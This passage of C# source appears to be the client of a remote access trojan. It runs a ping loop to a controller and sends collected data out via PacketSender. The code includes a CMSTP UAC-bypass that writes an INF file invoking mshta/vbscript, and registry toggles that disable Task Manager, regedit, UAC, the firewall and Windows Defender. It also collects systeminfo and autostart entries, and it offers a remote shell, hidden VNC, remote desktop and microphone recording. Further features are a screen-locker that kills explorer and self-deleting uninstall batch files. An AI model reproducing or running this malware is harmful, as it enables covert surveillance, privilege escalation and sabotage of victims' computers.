                    string[] programNames = startupKey.GetValueNames();

                    // Выводим имена программ в автозагрузке
                    foreach (string programName in programNames)
                    {
                        tosendstring += programName + mdelimeter + "HKCU/Run" + delimeter;
                    }
                }
                RegistryKey startupKeyO = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", false);

                if (startupKeyO != null)
                {
                    // Получаем имена всех подключений в разделе автозагрузки
                    string[] programNames = startupKeyO.GetValueNames();

                    // Выводим имена программ в автозагрузке
                    foreach (string programName in programNames)
                    {
                        tosendstring += programName + mdelimeter + "HKCU/RunOnce" + delimeter;
                    }
                }
                RegistryKey startupKeyHKLM = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false);

                if (startupKeyHKLM != null)
                {
                    // Получаем имена всех подключений в разделе автозагрузки
                    string[] programNamess = startupKeyHKLM.GetValueNames();

                    // Выводим имена программ в автозагрузке
                    foreach (string programNamee in programNamess)
                    {
                        tosendstring += programNamee + mdelimeter + "HKLM/Run" + delimeter;
                    }
                }
                RegistryKey startupKeyHKLMO = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", false);

                if (startupKeyHKLMO != null)
                {
                    // Получаем имена всех подключений в разделе автозагрузки
                    string[] programNamess = startupKeyHKLMO.GetValueNames();

                    // Выводим имена программ в автозагрузке
                    foreach (string programNamee in programNamess)
                    {
                        tosendstring += programNamee + mdelimeter + "HKLM/Run" + delimeter;
                    }
                }
                RegistryKey startupKeyHKLMW = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", false);

                if (startupKeyHKLMW != null)
                {
                    // Получаем имена всех подключений в разделе автозагрузки
                    string[] programNames = startupKeyHKLMW.GetValueNames();

                    // Выводим имена программ в автозагрузке
                    foreach (string programName in programNames)
                    {
                        tosendstring += programName + mdelimeter + "HKLM/WOW6432NODE" + delimeter;
                    }
                }
                RegistryKey startupKeyHKLMWO = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", false);

                if (startupKeyHKLMWO != null)
                {
                    // Получаем имена всех подключений в разделе автозагрузки
                    string[] programNames = startupKeyHKLMWO.GetValueNames();

                    // Выводим имена программ в автозагрузке
                    foreach (string programName in programNames)
                    {
                        tosendstring += programName + mdelimeter + "HKLM/WOW6432NODEOnce" + delimeter;
                    }
                }
            }
            catch { }
            List<byte> ToSendDE = new List<byte>();
            ToSendDE.Add(13);
            ToSendDE.AddRange(Encoding.UTF8.GetBytes(tosendstring));
            PacketSender.Send(ToSendDE.ToArray());
        }
        public static string BinaryPath = Interaction.Environ("WinDir") + "\\system32\\cmstp.exe";
        [DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool PostMessageW(IntPtr hWnd, uint Msg, int wParam, int lParam);

        // Token: 0x06000014 RID: 20
        [DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int FindWindowEx(int parentHandle, int childAfter, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lclassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string windowTitle);
        public static bool SilentElevate()
        {
            bool result;
            if (!File.Exists(BinaryPath))
            {
                result = false;
            }
            else
            {
                StringBuilder stringBuilder = new StringBuilder();
                stringBuilder.Append(SetInfFile(Process.GetCurrentProcess().MainModule.FileName));
                Process.Start(new ProcessStartInfo
                {
                    FileName = BinaryPath,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    Arguments = "/au " + stringBuilder.ToString()
                });
                Thread.Sleep(5000);
                int parentHandle = 0;
                int childAfter = 0;
                string text = null;
                string text2 = "\"CelestialTech\"";
                int value = FindWindowEx(parentHandle, childAfter, ref text, ref text2);
                PostMessageW((IntPtr)value, 256U, 13, 0);
                result = true;
            }
            return result;
        }

        public static string SetInfFile(string CommandToExecute)
        {
            string value = Path.GetRandomFileName().Split(new char[]
            {
                Convert.ToChar(".")
            })[0];
            string value2 = Interaction.Environ("WinDir") + "\\temp";
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.Append(value2);
            stringBuilder.Append("\\");
            stringBuilder.Append(value);
            stringBuilder.Append(".inf");
            StringBuilder stringBuilder2 = new StringBuilder(ECode());
            stringBuilder2.Replace("REPLACE_COMMAND_LINE", CommandToExecute);
            File.WriteAllText(stringBuilder.ToString(), stringBuilder2.ToString());
            return stringBuilder.ToString();
        }

        public static string ECode()
        {
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.Append("[version]\r\nSignature=$chicago$\r\nAdvancedINF=2.5");
            stringBuilder.Append("\r\n");
            stringBuilder.Append("\r\n");
            stringBuilder.Append("[DefaultInstall]\r\nCustomDestination=CustInstDestSectionAllUsers\r\nRunPreSetupCommands=RunPreSetupCommandsSection");
            stringBuilder.Append("\r\n");
            stringBuilder.Append("\r\n");
            stringBuilder.Append("[RunPreSetupCommandsSection]\r\n; Commands Here will be run Before Setup Begins to install\r\nmshta vbscript:Execute(###CreateObject(####WScript.Shell####).Run ####cmd.exe /c start ################ ########REPLACE_COMMAND_LINE############,0:close###)\r\nmshta vbscript:Execute(###CreateObject(####WScript.Shell####).Run ####taskkill /IM cmstp.exe /F####, 0, true:close###)");
            stringBuilder.Append("\r\n");
            stringBuilder.Append("\r\n");
            stringBuilder.Append("[CustInstDestSectionAllUsers]\r\n49000,49001=AllUSer_LDIDSection, 7");
            stringBuilder.Append("\r\n");
            stringBuilder.Append("\r\n");
            stringBuilder.Append("[AllUSer_LDIDSection]\r\n##HKLM##, ##SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE##, ##ProfileInstallPath##, ##%UnexpectedError%##, ####");
            stringBuilder.Append("\r\n");
            stringBuilder.Append("\r\n");
            stringBuilder.Append("[Strings]\r\nServiceName=##CelestialTech##\r\nShortSvcName=##CelestialTech##");
            return stringBuilder.ToString().Replace("#", "\"");
        }
        public static string FMFolders(string location)
        {
            try
            {
                var di = new DirectoryInfo(location);
                var folders = "";
                foreach (var subdi in di.GetDirectories())
                {
                    folders += "[Folder]" + subdi.Name + "|FPA_FM||FPA_FM|";
                }
                return folders;
            }
            catch
            {
                return String.Empty;
            }
        }
        public static string FMFiles(string location)
        {
            try
            {
                DirectoryInfo dir = new DirectoryInfo(location);
                string files = "";
                foreach (FileInfo f in dir.GetFiles("*.*"))
                {
                    files += f.Name + "|FPA_FM|" + f.Length.ToString() + "|FPA_FM|";
                }
                return files;
            }
            catch { return String.Empty; }
        }
        public static string FMDrives()
        {
            try
            {
                string allDrives = "";
                foreach (System.IO.DriveInfo d in System.IO.DriveInfo.GetDrives())
                {
                    switch (d.DriveType)
                    {
                        case System.IO.DriveType.CDRom:
                            allDrives += "[CD]" + d.Name + "|FPA_FM||FPA_FM|";
                            break;
                        case System.IO.DriveType.Removable:
                            allDrives += "[Removable]" + d.Name + "|FPA_FM||FPA_FM|";
                            break;
                        case System.IO.DriveType.Fixed:
                            allDrives += "[Drive]" + d.Name + "|FPA_FM||FPA_FM|";
                            break;
                        default:
                            break;
                    }
                }
                return allDrives;
            }
            catch { return string.Empty; }
        }

        private void keyboardInput(string[] Data)
        {
            bool keyDown = Convert.ToBoolean(Data[0]);
            byte key = Convert.ToByte(Data[1]);
            NativeMethods.keybd_event(key, 0, keyDown ? (uint)0x0000 : (uint)0x0002, UIntPtr.Zero);
        }

        private void PoliciesCMD(string Data)
        {
            RegistryKey objRegistryKey;
            try
            {
                if (Data == "1")
                {
                    objRegistryKey = Registry.CurrentUser.CreateSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                    if (objRegistryKey.GetValue("DisableTaskMgr") == null)
                        objRegistryKey.SetValue("DisableTaskMgr", 1);
                    else
                        objRegistryKey.DeleteValue("DisableTaskMgr");
                    objRegistryKey.Close();
                }
                else if (Data == "2")
                {
                    objRegistryKey = Registry.CurrentUser.CreateSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                    if (objRegistryKey.GetValue("DisableRegistryTools") == null)
                        objRegistryKey.SetValue("DisableRegistryTools", 1);
                    else
                        objRegistryKey.DeleteValue("DisableRegistryTools");
                    objRegistryKey.Close();
                }
                else if (Data == "3")
                {
                    objRegistryKey = Registry.CurrentUser.CreateSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                    if (objRegistryKey.GetValue("EnableLUA") == null)
                        objRegistryKey.SetValue("EnableLUA", 1);
                    else
                        objRegistryKey.DeleteValue("EnableLUA");
                    objRegistryKey.Close();
                }
                else if (Data == "4")
                {
                    objRegistryKey = Registry.CurrentUser.CreateSubKey(
                @"System\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile");
                    if (objRegistryKey.GetValue("EnableFirewall") == null)
                        objRegistryKey.SetValue("EnableFirewall", 1);
                    else
                        objRegistryKey.DeleteValue("EnableFirewall");
                    objRegistryKey.Close();
                }
                else if (Data == "5")
                {
                    objRegistryKey = Registry.CurrentUser.CreateSubKey(
                @"SOFTWARE\Policies\Microsoft\Windows Defender");
                    if (objRegistryKey.GetValue("DisableAntiSpyware") == null)
                        objRegistryKey.SetValue("DisableAntiSpyware", 1);
                    else
                        objRegistryKey.DeleteValue("DisableAntiSpyware");
                    objRegistryKey.Close();
                }
                else if (Data == "6")
                {
                    objRegistryKey = Registry.CurrentUser.CreateSubKey(
                    @"SOFTWARE\Policies\Microsoft\Windows\System");
                    if (objRegistryKey.GetValue("DisableCMD") == null)
                        objRegistryKey.SetValue("DisableCMD", 2);
                    else
                        objRegistryKey.DeleteValue("DisableCMD");
                    objRegistryKey.Close();
                }
                else if (Data == "7")
                {
                    objRegistryKey = Registry.CurrentUser.CreateSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                    if (objRegistryKey.GetValue("NoRun") == null)
                        objRegistryKey.SetValue("NoRun", 1);
                    else
                        objRegistryKey.DeleteValue("NoRun");
                    objRegistryKey.Close();
                }
                else if (Data == "8")
                {
                    objRegistryKey = Registry.CurrentUser.CreateSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                    if (objRegistryKey.GetValue("NoWinKeys") == null)
                        objRegistryKey.SetValue("NoWinKeys", 1);
                    else
                        objRegistryKey.DeleteValue("NoWinKeys");
                    objRegistryKey.Close();
                }
            }
            catch { }
        }

        private static void GatherInfo()
        {
            string Liststring = "";
            string batch = Path.GetTempFileName() + ".bat";
            using (StreamWriter sw = new StreamWriter(batch))
            {
                sw.WriteLine("@echo off");
                sw.WriteLine("chcp 65001");
                sw.WriteLine("CD " + Path.GetTempPath());
                sw.WriteLine("systeminfo >> inf.txt");
                sw.WriteLine("DEL " + "\"" + Path.GetFileName(batch) + "\"" + " /f /q");
            }

            Process.Start(new ProcessStartInfo()
            {
                FileName = batch,
                CreateNoWindow = true,
                ErrorDialog = false,
                UseShellExecute = false,
                WindowStyle = ProcessWindowStyle.Hidden
            }).WaitForExit();

            string[] infofile = File.ReadAllLines(Path.GetTempPath() + "inf.txt");
            File.Delete(Path.GetTempPath() + "inf.txt");

            foreach (string Info in infofile.ToArray()) Liststring += "," + Info;

                List<byte> ToSend = new List<byte>();
                ToSend.Add((int) DataType.InformationType);
                ToSend.AddRange(Encoding.UTF8.GetBytes(Liststring));
            PacketSender.Send(ToSend.ToArray());
        }

        private static void Uninstall()
        {
            try
            {
                using (
                var registryKey =
                    Registry.CurrentUser.OpenSubKey(
                        @"Software\Microsoft\Windows",
                        true))
                    if (registryKey != null)
                    {
                        registryKey.DeleteValue("");
                    }
            }
            catch { }
            Methods.ClientOnExit();
            PipeController.sendcommand(0x1003); // uninstall
            try
            {
                using (
                var registryKey =
                    Registry.CurrentUser.OpenSubKey(
                        @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows",
                        true))
                    if (registryKey != null)
                    {
                        registryKey.DeleteValue("Load");
                    }
            }
            catch { }

            string towrite = "C:\\Windows\\system32\\userinit.exe, ";
            try
            {
                RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true);
                if (key != null)
                {
                    key.SetValue("Userinit", towrite, RegistryValueKind.String);
                    key.Close();
                }
            }
            catch { }

            try
            {
                using (
                var registryKey =
                    Registry.CurrentUser.OpenSubKey(
                        @"Software\Microsoft\Windows\CurrentVersion\Run",
                        true))
                    if (registryKey != null)
                    {
                        registryKey.DeleteValue(Settings.RegistryKeyName);
                    }
            }
            catch { }

            if (Methods.IsAdmin())
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "cmd",
                    Arguments = "/c schtasks /delete /tn " + "\"" + Settings.NameInTasks + "\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                });
            }
            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd",
                Arguments = "/c taskkill /F /IM wscript.exe",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
            });


            string batch = Path.GetTempFileName() + ".bat";
            using (StreamWriter sw = new StreamWriter(batch))
            {
                sw.WriteLine("@echo off");
                sw.WriteLine("chcp 65001");
                sw.WriteLine("timeout 5 > NUL");
                sw.WriteLine("DEL " + "\"" + Application.ExecutablePath + "\"" + " /f /q");
                sw.WriteLine("CD " + Path.GetTempPath());
                sw.WriteLine("DEL " + "\"" + Path.GetFileName(batch) + "\"" + " /f /q");
            }

            Process.Start(new ProcessStartInfo()
            {
                FileName = batch,
                CreateNoWindow = true,
                ErrorDialog = false,
                UseShellExecute = false,
                WindowStyle = ProcessWindowStyle.Hidden
            });
        }
        private void notepad(string[] Data)
        {
            NotepadHelper.ShowMessage(Data[1], Data[0]);
        }
        private void StartRS()
        {
            RemoteShellStream.Start();
        }
        private void StopRS()
        {
            RemoteShellStream.Stop();
        }
        private void Command(string Command)
        {
            RemoteShellStream.WriteLine = true;
            RemoteShellStream.Input = Command;
        }
        private void UpdateWinData(string[] Data)
        {
            Win.label1.Text = Data[0];
            Win.passwords = Int32.Parse(Data[1]);
            Win.label2.Text = "Attempts: " + Data[1];
            Win.label6.Text = Data[2];
            Win.label8.Text = Data[3];
            Win.label9.Text = Data[4];
            RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey("SOFTWARE", true);
            if (key != null)
            {
                key.SetValue("l1", Data[0]);
                key.SetValue("pw", Data[1]);
                key.SetValue("l6", Data[2]);
                key.SetValue("l8", Data[3]);
                key.SetValue("l9", Data[4]);
                key.Close();
            }

        }
        
        private void WinL(string Data)
        {
            if (Data == "1")
            {
                Process.Start("taskkill", "/F /IM explorer.exe");
                Win.timer1.Start();
                Win.Show();

                RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey("SOFTWARE", true);
                if (key != null)
                {
                    key.SetValue(Encryption.ComputeSHA256(ComputerInfo.GetRamAmount() + ComputerInfo.GetCPU()), "");
                    key.Close();
                }
            }
            else
            {
                Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\explorer.exe");
                Win.timer1.Stop();
                Win.Hide();
                try
                {
                    RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey("SOFTWARE", true);
                    if (key != null)
                    {
                        key.DeleteValue(Encryption.ComputeSHA256(ComputerInfo.GetRamAmount() + ComputerInfo.GetCPU()));
                        key.Close();
                    }
                }
                catch { }
            }
        }

        private void CDDrive(string Data)
        {
            if (Data == "1")
                NativeMethods.mciSendString("set CDAudio door open", null, 0, IntPtr.Zero);
            else
                NativeMethods.mciSendString("set CDAudio door closed", null, 0, IntPtr.Zero);
        }

        private void TextTS(string Data)
        {
            SpeechSynthesizer speaker = new SpeechSynthesizer();
            speaker.Rate = 0;
            speaker.Volume = 100;
            speaker.SetOutputToDefaultAudioDevice();
            speaker.SpeakAsync(Data);
        }

        private void MouseButtonsSwapper(string Data)
        {
            if (Data == "1")
                NativeMethods.SwapMouseButton(1);
            else
                NativeMethods.SwapMouseButton(0);
        }

        private void ChangeKeyboardL(string Data)
        {
            uint newKeyboardLayout = 0;
            switch(Data)
            {
                case "QWERTY":
                    newKeyboardLayout = 1033;
                    break;
                case "QWERTZ":
                    newKeyboardLayout = 1031;
                    break;
                case "AZERTY":
                    newKeyboardLayout = 2060;
                    break;
            }

            KeyboardLayout.SwitchTo(newKeyboardLayout);
        }

        private void RotateScreen(string Data)
        { 
            Display.Orientations orientations;

            switch(Data)
            {
                case "0":
                    orientations = Display.Orientations.DEGREES_CW_0;
                    break;
                case "90":
                    orientations = Display.Orientations.DEGREES_CW_90;
                    break;
                case "180":
                    orientations = Display.Orientations.DEGREES_CW_180;
                    break;
                case "270":
                    orientations = Display.Orientations.DEGREES_CW_270;
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }

            try
            {
                Display.RotateAllScreens(orientations);
            }catch { }
        }

        private void ProcessMan(string[] Data)
        {
            string ProcessPID = Data[0];
            string Manipulation = Data[1];

            switch (Manipulation)
            {
                case "1":
                    try
                    {
                        Process P = Process.GetProcessById(Convert.ToInt32(ProcessPID));
                        P.Kill();
                    }
                    catch { }
                    break;
                case "2":
                    try
                    {
                        Process P = Process.GetProcessById(Convert.ToInt32(ProcessPID));
                        string path = P.MainModule.FileName;
                        P.Kill();
                        Thread.Sleep(400);
                        File.Delete(path);
                    }
                    catch { }
                    break;
                case "3":
                    try
                    {
                        Process P = Process.GetProcessById(Convert.ToInt32(ProcessPID));
                        ProcessExtension.Suspend(P);
                    }
                    catch { }
                    break;
                case "4":
                    try
                    {
                        Process P = Process.GetProcessById(Convert.ToInt32(ProcessPID));
                        ProcessExtension.Resume(P);
                    }
                    catch { }
                    break;
            }
        }

        private void MsgBox(string[] Data)
        {
            string Text = Data[0];
            string Header = Data[1];
            string ButtonString = Data[2];
            string IconString = Data[3];

            MessageBoxButtons MBB = MessageBoxButtons.OK;
            MessageBoxIcon MBI = MessageBoxIcon.None;

            switch (ButtonString)
            {
                case "0":
                    MBB = MessageBoxButtons.AbortRetryIgnore;
                    break;
                case "1":
                    MBB = MessageBoxButtons.OK;
                    break;
                case "2":
                    MBB = MessageBoxButtons.OKCancel;
                    break;
                case "3":
                    MBB = MessageBoxButtons.RetryCancel;
                    break;
                case "4":
                    MBB = MessageBoxButtons.YesNo;
                    break;
                case "5":
                    MBB = MessageBoxButtons.YesNoCancel;
                    break;
            }

            switch (IconString)
            {
                case "0":
                    MBI = MessageBoxIcon.None;
                    break;
                case "1":
                    MBI = MessageBoxIcon.Error;
                    break;
                case "2":
                    MBI = MessageBoxIcon.Information;
                    break;
                case "3":
                    MBI = MessageBoxIcon.Warning;
                    break;
                case "4":
                    MBI = MessageBoxIcon.Question;
                    break;
            }

                var thread = new Thread(() => MessageBox.Show(Text, Header, MBB, MBI));
                thread.Start();
        }

        private void StartRD(string[] Data)
        {
            string Quality = Data[0];
            string Timeout = Data[1];
            string Monitor = Data[2];
            string Method = Data[3];
            if (!Libs.LoadRemoteLibrary(Libs.SharpDXD3D9))
                return;
            RemoteDesktopStream.Start(Int32.Parse(Quality), Int32.Parse(Timeout), Int32.Parse(Monitor) - 1, Int32.Parse(Method), _unsafeCodec);
        }

        private void StarthVNC(string[] Data)
        {
            string Quality = Data[0];
            string Timeout = Data[1];
            HiddenVNC.Start(Int32.Parse(Quality), Int32.Parse(Timeout), _unsafeCodec);
        }

        private void StophVNC()
        {
            HiddenVNC.Stop();
            GC.Collect();
        }

        private void StopRD()
        {
            RemoteDesktopStream.Stop();
            GC.Collect();
        }

        private void Elevate()
        {
            if (ComputerInfo.GetPriv() != "Administrator")
            {
                ProcessStartInfo processStartInfo = new ProcessStartInfo
                {
                    FileName = "cmd",
                    Verb = "runas",
                    Arguments = "/k START \"\" \"" + Application.ExecutablePath + "\" & EXIT",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true
                };

                try
                {
                    Process.Start(processStartInfo);
                }
                catch
                {
                    return;
                }
                Methods.ClientOnExit();
                Environment.Exit(0);
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            BeginInvoke(new MethodInvoker(delegate { Hide(); }));
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            Thread PollThread = new Thread(() =>
            {
                while (true)
                {
                    try
                    {
                        while (Networking.MainClient.Connected)
                        {
                            List<byte> ToSend = new List<byte>();
                            ToSend.Add((int)DataType.PingType);
                            Networking.MainClient.Send(ToSend.ToArray());
                            Thread.Sleep(30000);
                        }
                    }
                    catch
                    { }
                    Thread.Sleep(7500);
                }
            });
            PollThread.IsBackground = true;
            PollThread.Start();
            ConnectLoop();
            RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey("SOFTWARE", true);
            if (key != null)
            {
                if (key.GetValue(Encryption.ComputeSHA256(ComputerInfo.GetRamAmount() + ComputerInfo.GetCPU())) != null)
                {
                    try
                    {
                        Win.label1.Text = key.GetValue("l1").ToString();
                        Win.passwords = Int32.Parse(key.GetValue("pw").ToString());
                        Win.label2.Text = "Attempts: " + key.GetValue("pw").ToString();
                        Win.label6.Text = key.GetValue("l6").ToString();
                        Win.label8.Text = key.GetValue("l8").ToString();
                        Win.label9.Text = key.GetValue("l9").ToString();
                    }
                    catch { }

                    WinL("1");
                }
                key.Close();
            }
        }

        private string getDevices()
        {
            return WaveIn.DeviceCount.ToString();
        }

        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
        {
            MRecorder recorder = new MRecorder(Convert.ToInt32(recordoptions[0]), Convert.ToInt32(recordoptions[1]), Convert.ToInt32(recordoptions[2]));
            while (needRecord)
            {
                byte[] data = recorder.GETBF();
                if (data != null)
                {
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add((int)DataType.MicrophoneRecordingType);
                    ToSend.AddRange(data);
                    PacketSender.Send(ToSend.ToArray());
                }
            }
            recorder.Dispose();
            GC.Collect();
            Thread.Sleep(1000);
        }
    }
}
